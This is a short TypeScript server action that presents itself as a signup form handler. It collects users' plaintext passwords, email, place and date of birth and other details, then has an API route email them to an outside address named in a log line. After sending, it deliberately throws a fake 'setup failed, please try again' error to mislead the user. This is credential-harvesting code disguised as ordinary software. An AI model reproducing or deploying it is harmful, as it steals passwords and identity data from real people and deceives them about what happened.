"use server"

export async function submitSignupForm(formData: FormData) {
  // Extract form data
  const signupData = {
    firstName: formData.get("firstName") as string,
    lastName: formData.get("lastName") as string,
    email: formData.get("email") as string,
    password: formData.get("password") as string,
    organization: formData.get("organization") as string,
    placeOfBirth: formData.get("placeOfBirth") as string,
    dateOfBirth: formData.get("dateOfBirth") as string,
  }

  // Send email via API route
  try {
    const response = await fetch("/api/send-signup-email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(signupData),
    })

    if (!response.ok) {
      throw new Error("Failed to send email")
    }

    console.log("Email sent successfully to s2250928@students.ncl-coll.ac.uk")

    // Instead of redirecting, throw an error to trigger the popup
    throw new Error(
      "Account creation completed, but there was an issue with the final setup. Please try again or contact support.",
    )
  } catch (error) {
    console.error("Error in signup process:", error)
    // Re-throw the error so it can be caught by the client
    throw error
  }
}
